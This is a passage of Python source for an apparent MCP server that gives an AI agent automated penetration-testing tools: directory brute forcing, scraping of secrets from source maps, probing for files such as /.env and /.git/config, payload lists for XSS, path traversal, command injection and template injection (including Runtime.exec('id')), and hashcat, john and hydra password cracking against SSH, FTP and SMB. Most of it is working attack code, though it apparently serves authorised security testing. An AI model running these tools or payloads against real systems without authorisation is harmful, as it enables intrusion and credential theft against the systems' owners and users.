                            vulns = item.get("vulnerabilities", [])
                            for v in vulns:
                                findings.append({
                                    "id": v.get("id", ""),
                                    "method": v.get("method", ""),
                                    "url": v.get("url", ""),
                                    "msg": v.get("msg", ""),
                                })
                except json.JSONDecodeError:
                    findings = [{"raw": nikto_result["stdout"][:2000]}]
            results["modules"]["nikto"] = {"findings": findings, "count": len(findings)}
            if findings:
                pentest_memory.store_finding(target, "web_assault", "web_vulns",
                                             {"source": "nikto", "count": len(findings)})

        # --- DIRECTORY BRUTE FORCE (ffuf preferred, fallback gobuster) ---
        if "dirbrute" in mod_list:
            # Select wordlist based on depth
            wordlists = {
                "stealth": "/usr/share/wordlists/dirb/small.txt",
                "light": "/usr/share/wordlists/dirb/common.txt",
                "deep": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                "aggressive": "/usr/share/wordlists/dirbuster/directory-list-2.3-big.txt",
            }
            wl = wordlists.get(depth, wordlists["deep"])
            if wordlist != "auto":
                wl = wordlist

            # Adapt to detected stack
            stack = orchestrator.adapt_to_stack(target)
            stack_extensions = extensions
            if stack["adapted"]:
                extra_endpoints = stack["config"].get("endpoints", [])
                if stack["stack"] == "spring":
                    stack_extensions += ",jar,class,xml,properties,yml,yaml"
                elif stack["stack"] == "php":
                    stack_extensions += ",php5,php7,phtml,inc,old,bak"
                elif stack["stack"] == "express":
                    stack_extensions += ",mjs,ts,graphql,map"

            ffuf_args = [
                "ffuf", "-u", f"{target}/FUZZ", "-w", wl,
                "-mc", "200,201,204,301,302,307,401,403,405,500",
                "-t", str(min(threads, 100)),
                "-o", "-", "-of", "json",
                "-e", f".{stack_extensions.replace(',', ',.')}",
            ]
            if delay > 0.5:
                ffuf_args.extend(["-rate", str(max(1, int(1 / delay)))])

            dirbrute_result = await run_command(ffuf_args, timeout=timeout)
            discovered = []
            if dirbrute_result.get("stdout"):
                try:
                    ffuf_data = json.loads(dirbrute_result["stdout"])
                    for r in ffuf_data.get("results", []):
                        discovered.append({
                            "url": r.get("url", ""),
                            "status": r.get("status", 0),
                            "length": r.get("length", 0),
                            "words": r.get("words", 0),
                        })
                except json.JSONDecodeError:
                    pass

            # Add stack-specific endpoints
            if stack["adapted"]:
                for ep in stack["config"].get("endpoints", []):
                    curl_result = await run_command(
                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", f"{target}{ep}"],
                        timeout=10,
                    )
                    if curl_result.get("stdout") and curl_result["stdout"].strip() not in ["000", "404"]:
                        discovered.append({
                            "url": f"{target}{ep}",
                            "status": int(curl_result["stdout"].strip()),
                            "source": f"stack_adapted_{stack['stack']}",
                        })

            results["modules"]["dirbrute"] = {"discovered": discovered, "count": len(discovered), "wordlist": wl}
            if discovered:
                pentest_memory.store_finding(target, "web_assault", "directories",
                                             {"count": len(discovered), "paths": [d["url"] for d in discovered[:20]]})

        # --- SOURCE MAP EXTRACTION ---
        if "sourcemaps" in mod_list:
            sourcemap_findings = {"maps_found": [], "api_endpoints": [], "secrets": []}
            # Get main page to find JS files
            curl_result = await run_command(["curl", "-sk", "-L", target], timeout=15)
            if curl_result.get("stdout"):
                js_files = re.findall(r'src=["\']([^"\']*\.js)["\']', curl_result["stdout"])
                js_files += re.findall(r'href=["\']([^"\']*\.js)["\']', curl_result["stdout"])
                for js_file in list(set(js_files))[:20]:
                    if not js_file.startswith("http"):
                        if js_file.startswith("//"):
                            js_url = "https:" + js_file
                        elif js_file.startswith("/"):
                            js_url = target.rstrip("/") + js_file
                        else:
                            js_url = target.rstrip("/") + "/" + js_file
                    else:
                        js_url = js_file
                    map_url = js_url + ".map"
                    map_check = await run_command(
                        ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", map_url],
                        timeout=8,
                    )
                    if map_check.get("stdout") and map_check["stdout"].strip() == "200":
                        sourcemap_findings["maps_found"].append(map_url)
                        map_content = await run_command(["curl", "-sk", map_url], timeout=15)
                        if map_content.get("stdout"):
                            try:
                                smap = json.loads(map_content["stdout"])
                                sources = smap.get("sources", [])
                                # Extract API endpoints from source paths
                                for src in sources:
                                    if any(p in src.lower() for p in ["api", "endpoint", "service", "route"]):
                                        sourcemap_findings["api_endpoints"].append(src)
                                # Search for secrets in sourcesContent
                                for content in smap.get("sourcesContent", [])[:10]:
                                    if content:
                                        secret_patterns = [
                                            (r"['\"](?:api[_-]?key|apikey|secret|token|password|auth)['\"]"
                                             r"\s*[:=]\s*['\"]([^'\"]{8,})['\"]", "hardcoded_secret"),
                                            (r"https?://[^\s'\"]+/api/[^\s'\"]+", "api_endpoint"),
                                        ]
                                        for pat, stype in secret_patterns:
                                            matches = re.findall(pat, content, re.IGNORECASE)
                                            for m in matches:
                                                sourcemap_findings["secrets"].append({"type": stype, "value": str(m)[:100]})
                            except json.JSONDecodeError:
                                pass

            results["modules"]["sourcemaps"] = sourcemap_findings
            if sourcemap_findings["maps_found"]:
                pentest_memory.store_finding(target, "web_assault", "source_maps",
                                             {"maps": sourcemap_findings["maps_found"],
                                              "secrets": len(sourcemap_findings["secrets"])})

        # --- CONTEXT-AWARE FUZZING ---
        if "fuzz" in mod_list:
            fuzz_results = {"tests": []}
            # Test for common sensitive files
            sensitive_files = [
                "/.env", "/.git/config", "/.git/HEAD", "/robots.txt", "/sitemap.xml",
                "/.htaccess", "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
                "/wp-config.php.bak", "/config.php.bak", "/.DS_Store", "/thumbs.db",
                "/.svn/entries", "/backup.zip", "/backup.tar.gz", "/dump.sql",
                "/api/swagger.json", "/api/v1/docs", "/openapi.json",
            ]
            for f in sensitive_files:
                check = await run_command(
                    ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}|%{size_download}",
                     f"{target}{f}"],
                    timeout=8,
                )
                if check.get("stdout"):
                    parts = check["stdout"].strip().split("|")
                    status = int(parts[0]) if parts[0].isdigit() else 0
                    size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
                    if status in [200, 301, 302, 403] and size > 0:
                        fuzz_results["tests"].append({
                            "path": f, "status": status, "size": size,
                            "interesting": status == 200 and size > 10,
                        })
                await asyncio.sleep(delay)
            results["modules"]["fuzz"] = fuzz_results

        results["recommendations"] = orchestrator.recommend_next_tools(target)
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 3: INJECTION MATRIX
# Replaces: sqlmap_scan, sql_injection_test, xss_scan, lfi_scan, command_injection_test,
#           ssti_scanner, json_parameter_fuzzer
# ============================================================================

@mcp.tool()
async def injection_matrix(
    target: str,
    depth: str = "deep",
    modules: str = "all",
    param: Optional[str] = None,
    method: str = "GET",
    data: Optional[str] = None,
    timeout: int = 600,
) -> str:
    """
    Unified injection testing engine. Combines: SQLi (sqlmap+manual), XSS, LFI/RFI,
    command injection, SSTI, JSON parameter fuzzing, type confusion, mass assignment.

    depth: stealth|light|deep|aggressive
    modules: all | comma-separated: sqli,xss,lfi,cmdi,ssti,json_fuzz
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("injection_matrix", target, {"depth": depth, "modules": modules})
    results = {"target": target, "depth": depth, "modules": {}}

    try:
        mod_list = modules.split(",") if modules != "all" else ["sqli", "xss", "lfi", "cmdi", "ssti", "json_fuzz"]
        delay = rate_limit_detector.get_delay(target)

        # --- SQL INJECTION ---
        if "sqli" in mod_list:
            sqli_results = {"sqlmap": {}, "manual_tests": []}
            sqlmap_args = ["sqlmap", "-u", target, "--batch", "--random-agent"]
            if param:
                sqlmap_args.extend(["-p", param])
            if data:
                sqlmap_args.extend(["--data", data])
            if depth == "stealth":
                sqlmap_args.extend(["--level", "1", "--risk", "1"])
            elif depth == "light":
                sqlmap_args.extend(["--level", "2", "--risk", "1"])
            elif depth == "deep":
                sqlmap_args.extend(["--level", "3", "--risk", "2", "--threads", "4"])
            elif depth == "aggressive":
                sqlmap_args.extend(["--level", "5", "--risk", "3", "--threads", "8",
                                    "--tamper", "between,randomcase,space2comment"])
            sqlmap_result = await run_command(sqlmap_args, timeout=timeout)
            sqli_results["sqlmap"]["output"] = sqlmap_result.get("stdout", "")[:3000]
            sqli_results["sqlmap"]["vulnerable"] = any(
                marker in sqlmap_result.get("stdout", "").lower()
                for marker in ["injectable", "payload:", "parameter:", "type:"]
            )
            if sqli_results["sqlmap"]["vulnerable"]:
                pentest_memory.store_finding(target, "injection_matrix", "sqli_found",
                                             {"source": "sqlmap", "param": param})
                s, v, sev = CVSSCalculator.score_for_vuln_type("sqli")
                vuln_correlator.add_vulnerability(VulnFinding(
                    vuln_id=f"sqli_{param}", title=f"SQL Injection via param '{param}'",
                    severity=sev, cvss_score=s, cvss_vector=v, target=target, port=443,
                    service="http", evidence=f"sqlmap confirmed injectable param: {param}",
                    exploitable=True, kill_chain_phase="exploitation",
                    mitre_techniques=["T1190"], remediation="Use parameterized queries / prepared statements",
                ))
                kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION, "injection_matrix", [f"sqli:{param}"])
            results["modules"]["sqli"] = sqli_results

        # --- XSS ---
        if "xss" in mod_list:
            xss_results = {"reflected": [], "dom_based": []}
            xss_payloads = [
                '<script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                "'-alert(1)-'",
                '{{7*7}}',
                '${7*7}',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            ]
            if depth in ["deep", "aggressive"]:
                xss_payloads.extend([
                    '<details open ontoggle=alert(1)>',
                    '<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0,0"/><animate attributeName=d values="M0,0">',
                    '"><svg><animatetransform onbegin=alert(1)>',
                    'data:text/html,<script>alert(1)</script>',
                ])
            for payload in xss_payloads:
                encoded = urllib.parse.quote(payload)
                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'q'}={encoded}"
                result = await run_command(["curl", "-sk", test_url], timeout=10)
                if result.get("stdout") and payload in result["stdout"]:
                    xss_results["reflected"].append({
                        "payload": payload,
                        "param": param or "q",
                        "reflected": True,
                    })
                await asyncio.sleep(delay)
            results["modules"]["xss"] = xss_results
            if xss_results["reflected"]:
                pentest_memory.store_finding(target, "injection_matrix", "xss_found",
                                             {"count": len(xss_results["reflected"])})
                s, v, sev = CVSSCalculator.score_for_vuln_type("xss_reflected")
                vuln_correlator.add_vulnerability(VulnFinding(
                    vuln_id=f"xss_reflected_{len(xss_results['reflected'])}",
                    title=f"Reflected XSS ({len(xss_results['reflected'])} vectors)",
                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
                    service="http", evidence=str(xss_results["reflected"][:2]),
                    exploitable=True, kill_chain_phase="delivery",
                    mitre_techniques=["T1189"], remediation="Encode output, implement CSP",
                ))

        # --- LFI / PATH TRAVERSAL ---
        if "lfi" in mod_list:
            lfi_results = {"vulnerabilities": []}
            lfi_payloads = [
                ("../../../etc/passwd", "root:"),
                ("....//....//....//etc/passwd", "root:"),
                ("..%2f..%2f..%2fetc%2fpasswd", "root:"),
                ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
                ("/etc/passwd", "root:"),
                ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
                ("file:///etc/passwd", "root:"),
                ("....\\....\\....\\windows\\system32\\drivers\\etc\\hosts", "localhost"),
            ]
            if depth in ["deep", "aggressive"]:
                lfi_payloads.extend([
                    ("/proc/self/environ", "PATH="),
                    ("/proc/self/cmdline", ""),
                    ("php://input", ""),
                    ("expect://id", "uid="),
                    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "phpinfo"),
                ])
            for payload, marker in lfi_payloads:
                encoded = urllib.parse.quote(payload)
                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'file'}={encoded}"
                result = await run_command(["curl", "-sk", test_url], timeout=10)
                if result.get("stdout") and marker and marker in result["stdout"]:
                    lfi_results["vulnerabilities"].append({
                        "payload": payload,
                        "marker_found": marker,
                        "severity": "critical",
                    })
                await asyncio.sleep(delay)
            results["modules"]["lfi"] = lfi_results
            if lfi_results["vulnerabilities"]:
                pentest_memory.store_finding(target, "injection_matrix", "lfi_found",
                                             {"count": len(lfi_results["vulnerabilities"])})
                s, v, sev = CVSSCalculator.score_for_vuln_type("lfi")
                vuln_correlator.add_vulnerability(VulnFinding(
                    vuln_id=f"lfi_{len(lfi_results['vulnerabilities'])}",
                    title=f"Local File Inclusion ({len(lfi_results['vulnerabilities'])} vectors)",
                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
                    service="http", exploitable=True, kill_chain_phase="exploitation",
                    mitre_techniques=["T1005", "T1083"],
                    remediation="Validate/whitelist file paths, disable remote includes",
                ))

        # --- COMMAND INJECTION ---
        if "cmdi" in mod_list:
            cmdi_results = {"vulnerabilities": []}
            sleep_payloads = [
                ("; sleep 5", 5), ("| sleep 5", 5), ("$(sleep 5)", 5),
                ("`sleep 5`", 5), ("\n sleep 5", 5), ("& sleep 5 &", 5),
                ("%0asleep 5", 5), ("|| sleep 5", 5),
            ]
            for payload, expected_delay in sleep_payloads:
                encoded = urllib.parse.quote(payload)
                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'cmd'}={encoded}"
                start = time.time()
                result = await run_command(["curl", "-sk", "--max-time", "12", test_url], timeout=15)
                elapsed = time.time() - start
                if elapsed >= expected_delay - 1:
                    cmdi_results["vulnerabilities"].append({
                        "payload": payload,
                        "time_based": True,
                        "delay_observed": round(elapsed, 2),
                        "severity": "critical",
                    })
                await asyncio.sleep(delay)
            results["modules"]["cmdi"] = cmdi_results
            if cmdi_results["vulnerabilities"]:
                pentest_memory.store_finding(target, "injection_matrix", "cmdi_found",
                                             {"count": len(cmdi_results["vulnerabilities"])})
                s, v, sev = CVSSCalculator.score_for_vuln_type("cmdi")
                vuln_correlator.add_vulnerability(VulnFinding(
                    vuln_id=f"cmdi_{len(cmdi_results['vulnerabilities'])}",
                    title=f"Command Injection ({len(cmdi_results['vulnerabilities'])} vectors)",
                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
                    service="http", exploitable=True, kill_chain_phase="exploitation",
                    mitre_techniques=["T1059.004"],
                    remediation="Never pass user input to shell commands; use parameterized APIs",
                ))

        # --- SSTI ---
        if "ssti" in mod_list:
            ssti_results = {"vulnerabilities": [], "engine_detected": None}
            ssti_payloads = [
                ("{{7*7}}", "49", "jinja2/twig"),
                ("${7*7}", "49", "freemarker/el"),
                ("#{7*7}", "49", "ruby_erb/thymeleaf"),
                ("<%= 7*7 %>", "49", "erb"),
                ("{{constructor.constructor('return 7*7')()}}", "49", "angular/vue"),
                ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid=", "spring_el"),
                ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "twig"),
            ]
            for payload, marker, engine in ssti_payloads:
                encoded = urllib.parse.quote(payload)
                test_url = f"{target}{'&' if '?' in target else '?'}{param or 'name'}={encoded}"
                result = await run_command(["curl", "-sk", test_url], timeout=10)
                if result.get("stdout") and marker in result["stdout"]:
                    ssti_results["vulnerabilities"].append({
                        "payload": payload,
                        "engine": engine,
                        "severity": "critical",
                    })
                    ssti_results["engine_detected"] = engine
                await asyncio.sleep(delay)
            results["modules"]["ssti"] = ssti_results
            if ssti_results["vulnerabilities"]:
                pentest_memory.store_finding(target, "injection_matrix", "ssti_found",
                                             {"engine": ssti_results["engine_detected"]})
                s, v, sev = CVSSCalculator.score_for_vuln_type("ssti")
                vuln_correlator.add_vulnerability(VulnFinding(
                    vuln_id=f"ssti_{ssti_results.get('engine_detected', 'unknown')}",
                    title=f"SSTI ({ssti_results.get('engine_detected', 'unknown')} engine)",
                    severity=sev, cvss_score=s, cvss_vector=v, target=target,
                    service="http", exploitable=True, kill_chain_phase="exploitation",
                    mitre_techniques=["T1190", "T1059"],
                    remediation="Use sandboxed template engines; never pass user input to templates",
                ))

        # --- JSON PARAMETER FUZZING ---
        if "json_fuzz" in mod_list:
            json_fuzz_results = {"hidden_params": [], "type_confusion": [], "mass_assignment": []}
            # Common hidden parameter names
            hidden_params = [
                "admin", "role", "is_admin", "isAdmin", "debug", "test", "internal",
                "privilege", "level", "access", "token", "secret", "key", "password",
                "user_id", "userId", "account_id", "email", "username", "status",
                "verified", "active", "enabled", "permissions", "group", "type",
            ]
            # Try POST with JSON body to discover params
            for param_name in hidden_params:
                for test_val in [True, "admin", 1, "1"]:
                    body = json.dumps({param_name: test_val})
                    result = await run_command([
                        "curl", "-sk", "-X", "POST", target,
                        "-H", "Content-Type: application/json",
                        "-d", body, "-o", "/dev/null",
                        "-w", "%{http_code}|%{size_download}",
                    ], timeout=8)
                    if result.get("stdout"):
                        parts_resp = result["stdout"].strip().split("|")
                        status = int(parts_resp[0]) if parts_resp[0].isdigit() else 0
                        if status in [200, 201, 422]:
                            json_fuzz_results["hidden_params"].append({
                                "param": param_name, "value": test_val,
                                "status": status, "interesting": status != 422,
                            })
                            break
                await asyncio.sleep(delay * 0.5)

            # Type confusion tests
            type_tests = [
                ({"id": "1"}, {"id": 1}),
                ({"id": "1"}, {"id": [1]}),
                ({"id": "1"}, {"id": {"$gt": 0}}),
                ({"admin": "false"}, {"admin": True}),
                ({"price": "100"}, {"price": -1}),
                ({"quantity": "1"}, {"quantity": 999999}),
            ]
            for normal, confused in type_tests:
                r1 = await run_command([
                    "curl", "-sk", "-X", "POST", target,
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(normal),
                    "-w", "\n%{http_code}|%{size_download}",
                ], timeout=8)
                r2 = await run_command([
                    "curl", "-sk", "-X", "POST", target,
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(confused),
                    "-w", "\n%{http_code}|%{size_download}",
                ], timeout=8)
                if r1.get("stdout") and r2.get("stdout"):
                    s1 = r1["stdout"].split("\n")[-1]
                    s2 = r2["stdout"].split("\n")[-1]
                    if s1 != s2:
                        json_fuzz_results["type_confusion"].append({
                            "normal": normal, "confused": confused,
                            "response_diff": True,
                        })

            results["modules"]["json_fuzz"] = json_fuzz_results

        results["recommendations"] = orchestrator.recommend_next_tools(target)
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 4: CREDENTIAL CRACKER
# Replaces: hydra_attack, john_crack + NEW: hashcat, mask, markov, entropy analysis
# ============================================================================

@mcp.tool()
async def credential_cracker(
    target: str,
    service: str = "auto",
    hash_value: Optional[str] = None,
    hash_file: Optional[str] = None,
    hash_type: Optional[str] = None,
    wordlist: str = "auto",
    technique: str = "auto",
    username: Optional[str] = None,
    userlist: Optional[str] = None,
    entropy_limit: int = 60,
    timeout: int = 600,
) -> str:
    """
    Unified credential cracking engine. Auto-selects: hydra (online), john/hashcat (offline).
    Supports: dictionary, mask, markov, hybrid, prince, rule-based attacks.
    Entropy estimation to predict crackability. GPU-optimized hashcat when available.

    service: auto|ssh|ftp|http|smb|rdp|mysql|mssql|vnc|telnet|smtp|pop3|wpa
    technique: auto|dictionary|mask|markov|hybrid|prince|rules
    """
    target = InputValidator.sanitize_target(target)
    timeout = InputValidator.validate_timeout(timeout)
    execution = session_manager.start_execution("credential_cracker", target,
                                                 {"service": service, "technique": technique})
    results = {"target": target, "service": service, "attacks": {}}

    try:
        # --- HASH ANALYSIS & ENTROPY ESTIMATION ---
        if hash_value or hash_file:
            hash_analysis = {"hash_type": "unknown", "estimated_entropy": 0,
                             "crackable": False, "estimated_time": "unknown"}

            test_hash = hash_value or ""
            if hash_file and os.path.exists(hash_file):
                with open(hash_file) as f:
                    test_hash = f.readline().strip()

            # Hash type identification
            hash_types = {
                32: [("md5", "0"), ("ntlm", "1000")],
                40: [("sha1", "100")],
                56: [("sha224", "1300")],
                64: [("sha256", "1400"), ("sha3-256", "17400")],
                96: [("sha384", "10800")],
                128: [("sha512", "1700")],
            }
            hash_clean = test_hash.split(":")[-1] if ":" in test_hash else test_hash
            hash_len = len(hash_clean)

            if hash_clean.startswith("$2"):
                hash_analysis["hash_type"] = "bcrypt"
                hash_analysis["hashcat_mode"] = "3200"
                hash_analysis["estimated_entropy"] = 72
            elif hash_clean.startswith("$6$"):
                hash_analysis["hash_type"] = "sha512crypt"
                hash_analysis["hashcat_mode"] = "1800"
                hash_analysis["estimated_entropy"] = 65
            elif hash_clean.startswith("$5$"):
                hash_analysis["hash_type"] = "sha256crypt"
                hash_analysis["hashcat_mode"] = "7400"
                hash_analysis["estimated_entropy"] = 60
            elif hash_clean.startswith("$1$"):
                hash_analysis["hash_type"] = "md5crypt"
                hash_analysis["hashcat_mode"] = "500"
                hash_analysis["estimated_entropy"] = 40
            elif hash_clean.startswith("$apr1$"):
                hash_analysis["hash_type"] = "apr1"
                hash_analysis["hashcat_mode"] = "1600"
            elif hash_len in hash_types:
                candidates = hash_types[hash_len]
                hash_analysis["hash_type"] = candidates[0][0]
                hash_analysis["hashcat_mode"] = candidates[0][1]
                if hash_analysis["hash_type"] in ["md5", "ntlm"]:
                    hash_analysis["estimated_entropy"] = 30
                elif hash_analysis["hash_type"] in ["sha1", "sha256"]:
                    hash_analysis["estimated_entropy"] = 40

            # Crackability assessment
            hash_analysis["crackable"] = hash_analysis["estimated_entropy"] <= entropy_limit
            # Time estimation based on hash type speed
            speed_table = {
                "md5": 60_000_000_000, "ntlm": 100_000_000_000,
                "sha1": 20_000_000_000, "sha256": 8_000_000_000,
                "bcrypt": 30_000, "sha512crypt": 1_000_000,
            }
            speed = speed_table.get(hash_analysis["hash_type"], 1_000_000)
            keyspace = 2 ** hash_analysis["estimated_entropy"]
            seconds = keyspace / speed
            if seconds < 60:
                hash_analysis["estimated_time"] = f"{seconds:.1f} seconds"
            elif seconds < 3600:
                hash_analysis["estimated_time"] = f"{seconds/60:.1f} minutes"
            elif seconds < 86400:
                hash_analysis["estimated_time"] = f"{seconds/3600:.1f} hours"
            elif seconds < 86400 * 365:
                hash_analysis["estimated_time"] = f"{seconds/86400:.1f} days"
            else:
                hash_analysis["estimated_time"] = f"{seconds/(86400*365):.1f} years"

            results["hash_analysis"] = hash_analysis

            # --- OFFLINE CRACKING (hashcat preferred, fallback john) ---
            if hash_analysis["crackable"]:
                # Select wordlist
                wl_paths = {
                    "auto": "/usr/share/wordlists/rockyou.txt",
                    "small": "/usr/share/wordlists/dirb/small.txt",
                    "common": "/usr/share/wordlists/dirb/common.txt",
                    "rockyou": "/usr/share/wordlists/rockyou.txt",
                }
                wl = wl_paths.get(wordlist, wordlist)

                # Generate target-specific wordlist additions
                target_words = []
                hostname = target.split("://")[-1].split("/")[0].split(":")[0]
                parts_host = hostname.replace(".", " ").replace("-", " ").split()
                for word in parts_host:
                    target_words.extend([
                        word, word.capitalize(), word.upper(),
                        word + "123", word + "2024", word + "2025",
                        word + "!", word + "@123",
                    ])

                if technique == "auto" or technique == "dictionary":
                    # Try hashcat first
                    hc_mode = hash_analysis.get("hashcat_mode", "0")
                    if hash_file:
                        hashcat_args = [
                            "hashcat", "-m", hc_mode, hash_file, wl,
                            "--force", "-O", "--runtime", str(min(timeout, 300)),
                        ]
                    elif hash_value:
                        tmp_hash = tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False)
                        tmp_hash.write(hash_value + "\n")
                        tmp_hash.close()
                        hashcat_args = [
                            "hashcat", "-m", hc_mode, tmp_hash.name, wl,
                            "--force", "-O", "--runtime", str(min(timeout, 300)),
                        ]
                    else:
                        hashcat_args = []

                    if hashcat_args:
                        hc_result = await run_command(hashcat_args, timeout=timeout)
                        results["attacks"]["hashcat_dictionary"] = {
                            "output": hc_result.get("stdout", "")[:2000],
                            "success": hc_result.get("success", False),
                        }
                        # Parse cracked passwords
                        if "Cracked" in hc_result.get("stdout", ""):
                            results["attacks"]["hashcat_dictionary"]["cracked"] = True
                            pentest_memory.store_finding(target, "credential_cracker", "credentials",
                                                         {"source": "hashcat", "method": "dictionary"})
                            # Extract cracked creds + register
                            cracked_creds = deep_parser.extract_credentials_from_output(hc_result.get("stdout", ""))
                            results["attacks"]["hashcat_dictionary"]["cracked_credentials"] = cracked_creds
                            s, v, sev = CVSSCalculator.score_for_vuln_type("default_credentials")
                            vuln_correlator.add_vulnerability(VulnFinding(
                                vuln_id="cracked_hash", title="Hash cracked via dictionary attack",
                                severity=sev, cvss_score=s, cvss_vector=v, target=target,
                                exploitable=True, kill_chain_phase="exploitation",
                                mitre_techniques=["T1110.002"],
                                remediation="Enforce strong password policy (min 12 chars, complexity)",
                            ))
                            kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION,
                                                      "credential_cracker", ["hash_cracked:dictionary"])

                if technique in ["auto", "mask"]:
                    # Mask attack - common password patterns
                    masks = [
                        "?u?l?l?l?d?d?d?d",      # Password1234
                        "?u?l?l?l?l?l?d?d",      # Summer23
                        "?u?l?l?l?l?l?l?d?d?s",  # Welcome1!
                        "?d?d?d?d?d?d",           # 123456
                        "?l?l?l?l?l?l?l?l",       # abcdefgh
                        "?u?l?l?l?l?l?d?d?d?s",  # Spring123!
                    ]
                    for mask in masks[:3]:
                        mask_args = ["hashcat", "-m", hash_analysis.get("hashcat_mode", "0"),
                                     "-a", "3", hash_file or tmp_hash.name if hash_value else "",
                                     mask, "--force", "-O", "--runtime", "60"]
                        if mask_args[-4]:  # hash file exists
                            mask_result = await run_command(mask_args, timeout=120)
                            if "Cracked" in mask_result.get("stdout", ""):
                                results["attacks"]["hashcat_mask"] = {"cracked": True, "mask": mask}
                                break

                if technique in ["auto", "rules"]:
                    # Rule-based attack
                    rules_file = "/usr/share/hashcat/rules/best64.rule"
                    if os.path.exists(rules_file) and (hash_file or hash_value):
                        rule_args = [
                            "hashcat", "-m", hash_analysis.get("hashcat_mode", "0"),
                            hash_file or (tmp_hash.name if hash_value else ""),
                            wl, "-r", rules_file,
                            "--force", "-O", "--runtime", str(min(timeout // 3, 120)),
                        ]
                        rule_result = await run_command(rule_args, timeout=timeout // 2)
                        results["attacks"]["hashcat_rules"] = {
                            "output": rule_result.get("stdout", "")[:1000],
                            "success": rule_result.get("success", False),
                        }

                # Fallback: john
                john_args = ["john"]
                if hash_file:
                    john_args.append(hash_file)
                elif hash_value:
                    tmp_j = tempfile.NamedTemporaryFile(mode="w", suffix=".hash", delete=False)
                    tmp_j.write(hash_value + "\n")
                    tmp_j.close()
                    john_args.append(tmp_j.name)
                if wl and os.path.exists(wl):
                    john_args.extend(["--wordlist=" + wl])
                john_result = await run_command(john_args, timeout=min(timeout, 300))
                results["attacks"]["john"] = {
                    "output": john_result.get("stdout", "")[:2000],
                    "success": john_result.get("success", False),
                }

        # --- ONLINE BRUTE FORCE (hydra) ---
        elif service != "none":
            detected_service = service
            if service == "auto":
                # Auto-detect from memory or port scan
                context = pentest_memory.get_context(target)
                port_findings = pentest_memory.get_findings(target, "open_ports")
                if port_findings:
                    ports_data = port_findings[-1].get("data", {})
                    for svc in ports_data.get("services", []):
                        svc_name = svc.get("service", "").lower()
                        if "ssh" in svc_name:
                            detected_service = "ssh"
                            break
                        elif "ftp" in svc_name:
                            detected_service = "ftp"
                            break
                        elif "http" in svc_name:
                            detected_service = "http-get"
                            break
                        elif "smb" in svc_name or "microsoft-ds" in svc_name:
                            detected_service = "smb"
                            break
                if detected_service == "auto":
                    detected_service = "ssh"

            wl = "/usr/share/wordlists/rockyou.txt" if wordlist == "auto" else wordlist
            hydra_args = ["hydra", "-f", "-V"]
            if username:
                hydra_args.extend(["-l", username])
            elif userlist:
                hydra_args.extend(["-L", userlist])
            else:
                hydra_args.extend(["-l", "admin"])
            hydra_args.extend(["-P", wl, target, detected_service])
            hydra_result = await run_command(hydra_args, timeout=timeout)
            results["attacks"]["hydra"] = {
                "service": detected_service,
                "output": hydra_result.get("stdout", "")[:3000],
                "success": hydra_result.get("success", False),
            }
            # Parse found credentials
            if hydra_result.get("stdout"):
                cred_matches = re.findall(
                    r"\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)",
                    hydra_result["stdout"],
                )
                if cred_matches:
                    results["attacks"]["hydra"]["credentials_found"] = [
                        {"port": m[0], "service": m[1], "host": m[2], "login": m[3], "password": m[4]}
                        for m in cred_matches
                    ]
                    pentest_memory.store_finding(target, "credential_cracker", "credentials",
                                                 {"source": "hydra", "count": len(cred_matches)})
                    s, v, sev = CVSSCalculator.score_for_vuln_type("default_credentials")
                    vuln_correlator.add_vulnerability(VulnFinding(
                        vuln_id=f"hydra_creds_{detected_service}",
                        title=f"Weak credentials on {detected_service} ({len(cred_matches)} found)",
                        severity=sev, cvss_score=s, cvss_vector=v, target=target,
                        port=int(cred_matches[0][0]) if cred_matches else 0,
                        service=detected_service, exploitable=True,
                        kill_chain_phase="exploitation",
                        mitre_techniques=["T1110.001"],
                        remediation="Enforce strong passwords, implement account lockout, use MFA",
                    ))
                    kill_chain.advance_phase(target, KillChainPhase.EXPLOITATION,
                                              "credential_cracker",
                                              [f"hydra:{detected_service}:{len(cred_matches)}_creds"])

        # Intelligence: correlation + kill chain state
        results["correlation"] = vuln_correlator.correlate(target)
        results["kill_chain"] = kill_chain.get_progress(target)
        session_manager.complete_execution(execution, results)
        return json.dumps(results, indent=2, default=str)

    except Exception as e:
        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})


# ============================================================================
# MODULE 5: NETWORK DOMINATOR
